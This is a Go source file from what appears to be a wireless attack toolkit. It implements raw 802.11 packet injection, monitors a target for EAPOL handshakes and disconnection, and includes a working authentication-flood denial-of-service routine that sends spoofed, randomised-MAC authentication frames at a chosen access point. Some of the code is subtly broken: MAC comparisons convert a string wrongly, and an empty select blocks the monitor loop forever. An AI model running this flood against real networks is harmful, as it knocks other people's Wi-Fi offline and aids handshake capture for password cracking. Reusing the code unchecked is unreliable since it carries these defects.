package injection

import (
	"bytes"
	"context"
	"fmt"
	"log"
	"math/rand"
	"net"
	"os/exec"
	"sync"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
	"github.com/lcalzada-xor/wmap/internal/core/domain"
	"github.com/lcalzada-xor/wmap/internal/telemetry"
)

// execCommand allows mocking in tests
var execCommand = exec.Command

// Injector handles active packet injection.
// Injector handles active packet injection.
type Injector struct {
	mechanism PacketInjector
	Handle    *pcap.Handle // Kept for Monitor usage, but injection should use mechanism
	Interface string
	mu        sync.Mutex
	seq       uint16

	// Shared serialization buffer to reduce allocations?
	// For now, we allocate per packet to avoid race conditions easily,
	// but we could use a sync.Pool in future.
}

// randomMAC generates a random unicast MAC address
func randomMAC() net.HardwareAddr {
	buf := make([]byte, 6)
	rand.Read(buf)
	// Set locally administered bit (bit 1 of first byte) and unset multicast bit (bit 0)
	buf[0] = (buf[0] | 0x02) & 0xfe
	return net.HardwareAddr(buf)
}

// NewInjector creates a new Injector.
func NewInjector(iface string) (*Injector, error) {
	// 1. Monitor Handle (PCAP) - Always needed for watching packets
	handle, err := pcap.OpenLive(iface, 65536, true, pcap.BlockForever)
	if err != nil {
		return nil, fmt.Errorf("monitor handle: %w", err)
	}

	// 2. Injection Mechanism (Raw Socket preference)
	// Try Raw first (Linux)
	var mech PacketInjector
	mech, err = NewRawInjector(iface)
	if err != nil {
		log.Printf("Raw injection unavailable (%v), falling back to PCAP", err)
		// Fallback to PCAP Injector
		mech, err = NewPcapInjector(iface)
		if err != nil {
			handle.Close()
			return nil, fmt.Errorf("injection init failed: %w", err)
		}
	} else {
		log.Printf("Using Raw Socket Injection on %s", iface)
	}

	return &Injector{
		Handle:    handle,
		mechanism: mech,
		Interface: iface,
		seq:       uint16(rand.Intn(4096)),
	}, nil
}

// Close releases resources held by the Injector.
func (i *Injector) Close() {
	i.mu.Lock()
	defer i.mu.Unlock()
	if i.Handle != nil {
		i.Handle.Close()
		i.Handle = nil
	}
	// Mechanism (Raw/Pcap) might need closing too if interface supports it?
	// Currently PacketInjector interface doesn't have Close, let's check definitions.
	// Assuming raw socket might need closing.
}

// SetMechanismForTest allows overriding the injection mechanism for testing.
func (i *Injector) SetMechanismForTest(mech PacketInjector) {
	i.mechanism = mech
}

// Inject sends a raw packet using the underlying mechanism.
func (i *Injector) Inject(packet []byte) error {
	i.mu.Lock()
	defer i.mu.Unlock()
	return i.mechanism.Inject(packet)
}

// StartMonitor starts a background packet listener to detect effectiveness events.
// It sends events ("handshake", "probe") to the provided channel.
// StartMonitor starts a background packet listener to detect effectiveness events.
// It opens a separate pcap handle to avoid concurrent usage issues with the injection handle.
func (i *Injector) StartMonitor(ctx context.Context, targetMAC string, events chan<- string) {
	// Open a new handle for monitoring
	monitorHandle, err := pcap.OpenLive(i.Interface, 65536, true, pcap.BlockForever)
	if err != nil {
		log.Printf("Monitor: Failed to open handle on %s: %v", i.Interface, err)
		return
	}
	defer monitorHandle.Close()

	// Filter: (EAPOL) OR (Probe Request from Target) OR (Data from Target)
	// EAPOL: ether proto 0x888e
	// ProbeReq: type mgt subtype probe-req and wlan.sa == targetMAC
	// Data: type data and wlan.sa == targetMAC
	filter := fmt.Sprintf("(ether proto 0x888e) or (type mgt subtype probe-req and wlan addr2 %s) or (type data and wlan addr2 %s)", targetMAC, targetMAC)

	if err := monitorHandle.SetBPFFilter(filter); err != nil {
		log.Printf("Monitor: Failed to set BPF filter: %v", err)
		return
	}

	source := gopacket.NewPacketSource(monitorHandle, monitorHandle.LinkType())
	packets := source.Packets()

	log.Printf("Monitor: Started listening for events on %s (Filter: %s)", targetMAC, filter)

	// Silence Detection State
	lastDataTime := time.Time{}
	hasSeenData := false
	silenceThreshold := 3 * time.Second
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return
		case <-ticker.C:
			// Check for silence only if we have seen data before (to avoid false positives on start)
			if hasSeenData && !lastDataTime.IsZero() {
				if time.Since(lastDataTime) > silenceThreshold {
					select {
					case events <- "disconnected":
						// Reset to avoid spamming the event
						hasSeenData = false
					default:
					}
				}
			}
		case packet, ok := <-packets:
			if !ok {
				return
			}

			// Check packet type
			// basic check if it's EAPOL
			if layer := packet.Layer(layers.LayerTypeEAPOL); layer != nil {
				select {
				case events <- "handshake":
				default:
				}
				log.Printf("Monitor: Detected HANDSHAKE for %s", targetMAC)
				continue
			}

			if dot11Layer := packet.Layer(layers.LayerTypeDot11); dot11Layer != nil {
				dot11, _ := dot11Layer.(*layers.Dot11)

				// Check for Data Frames (Activity)
				if dot11.Type.MainType() == layers.Dot11TypeData {
					// Verify source is target (should be covered by BPF but good to be safe)
					if bytes.Equal(dot11.Address2, net.HardwareAddr(targetMAC)) {
						lastDataTime = time.Now()
						if !hasSeenData {
							hasSeenData = true
							log.Printf("Monitor: Target %s is ACTIVE (Data detected)", targetMAC)
						}
					}
				}

				// Monitor Self-Injection (Loopback validation)
				if dot11.Type == layers.Dot11TypeMgmtDeauthentication {
					if bytes.Equal(dot11.Address2, net.HardwareAddr(targetMAC)) {
						// log.Printf("Monitor: Loopsback saw deauth from %s", targetMAC)
					}
				}

				if dot11.Type == layers.Dot11TypeMgmtProbeReq {
					select {}
				}
			}
		}
	}
}

// SniffSequenceNumber listens for a valid frame from the target to get the next sequence number.
// Returns a random number if sniffing fails or times out.
func (i *Injector) SniffSequenceNumber(ctx context.Context, targetMAC net.HardwareAddr) uint16 {
	// Create a short-lived handle for sniffing
	// We use a timeout context
	sniffCtx, cancel := context.WithTimeout(ctx, 500*time.Millisecond) // Short sniff window
	defer cancel()

	handle, err := pcap.OpenLive(i.Interface, 65536, true, pcap.BlockForever)
	if err != nil {
		return uint16(rand.Intn(4096))
	}
	defer handle.Close()

	// Filter for frames FROM the target
	filter := fmt.Sprintf("wlan addr2 %s", targetMAC.String())
	if err := handle.SetBPFFilter(filter); err != nil {
		return uint16(rand.Intn(4096))
	}

	source := gopacket.NewPacketSource(handle, handle.LinkType())
	packets := source.Packets()

	select {
	case packet := <-packets:
		if dot11Layer := packet.Layer(layers.LayerTypeDot11); dot11Layer != nil {
			dot11, _ := dot11Layer.(*layers.Dot11)
			return dot11.SequenceNumber + 1
		}
	case <-sniffCtx.Done():
		// Timeout
	}

	return uint16(rand.Intn(4096))
}

// BroadcastProbe sends a Probe Request to the broadcast address.
func (i *Injector) BroadcastProbe(ssid string) error {
	i.mu.Lock()
	defer i.mu.Unlock()

	pkt, err := SerializeProbeRequest(ssid, i.seq)
	i.seq++
	if err != nil {
		return err
	}

	// Metric: Injection Attempt
	telemetry.InjectionsTotal.WithLabelValues(i.Interface, "probe_req").Inc()

	if err := i.mechanism.Inject(pkt); err != nil {
		telemetry.InjectionErrors.WithLabelValues(i.Interface, "probe_req").Inc()
		return fmt.Errorf("inject probe failed: %w", err)
	}

	return nil
}

func (i *Injector) OptimizeInterfaceForInjection() {
	cmd := execCommand("iw", "dev", i.Interface, "set", "bitrates", "legacy-2.4", "1", "2", "5.5", "11", "legacy-5", "6", "9", "12")
	if err := cmd.Run(); err != nil {
		log.Printf("Warning: Failed to optimize bitrate for %s: %v", i.Interface, err)
	} else {
		log.Printf("Interface %s optimized for robust injection (Legacy 2.4/5GHz)", i.Interface)
	}
}

// StartAuthFlood starts an Authentication Flood attack (MDK style)
func (i *Injector) StartAuthFlood(ctx context.Context, config domain.AuthFloodAttackConfig, statusChan chan<- domain.AuthFloodAttackStatus) error {
	// Optimize interface for robustness (Low 'n Slow)
	i.OptimizeInterfaceForInjection()

	targetMAC, err := net.ParseMAC(config.TargetBSSID)
	if err != nil {
		return fmt.Errorf("invalid target BSSID: %w", err)
	}

	// Prepare Fixed MAC if configured
	var fixedMAC net.HardwareAddr
	if !config.UseRandomMAC && config.FixedSourceMAC != "" {
		fixedMAC, err = net.ParseMAC(config.FixedSourceMAC)
		if err != nil {
			return fmt.Errorf("invalid fixed source MAC: %w", err)
		}
	}

	interval := config.PacketInterval
	if interval <= 0 {
		interval = 10 * time.Millisecond // Faster for Auth Flood
	}

	ticker := time.NewTicker(interval)
	defer ticker.Stop()

	for {
		select {
		case <-ctx.Done():
			return nil
		case <-ticker.C:
			// Generate Source MAC
			srcMAC := fixedMAC
			if config.UseRandomMAC {
				srcMAC = randomMAC()
			}
			if srcMAC == nil {
				srcMAC = randomMAC()
			}

			i.mu.Lock()
			seq := i.seq
			i.seq++
			i.mu.Unlock()

			// 1. RadioTap
			radiotap := &layers.RadioTap{
				Present: layers.RadioTapPresentRate,
				Rate:    5,
			}

			// 2. Dot11 Auth
			dot11 := &layers.Dot11{
				Type:           layers.Dot11TypeMgmtAuthentication,
				Address1:       targetMAC, // Destination (AP)
				Address2:       srcMAC,    // Source (Fake Client)
				Address3:       targetMAC, // BSSID
				SequenceNumber: seq,
			}

			// 3. Auth Body
			payload := []byte{
				0x00, 0x00, // Algorithm: Open System
				0x01, 0x00, // Sequence: 1
				0x00, 0x00, // Status: Successful
			}

			buf := gopacket.NewSerializeBuffer()
			opts := gopacket.SerializeOptions{FixLengths: true, ComputeChecksums: true}
			gopacket.SerializeLayers(buf, opts, radiotap, dot11, gopacket.Payload(payload))
			pkt := buf.Bytes()

			if err := i.Inject(pkt); err != nil {
				telemetry.InjectionErrors.WithLabelValues(i.Interface, "auth_flood").Inc()
			} else {
				telemetry.InjectionsTotal.WithLabelValues(i.Interface, "auth_flood").Inc()
			}
		}
	}
}
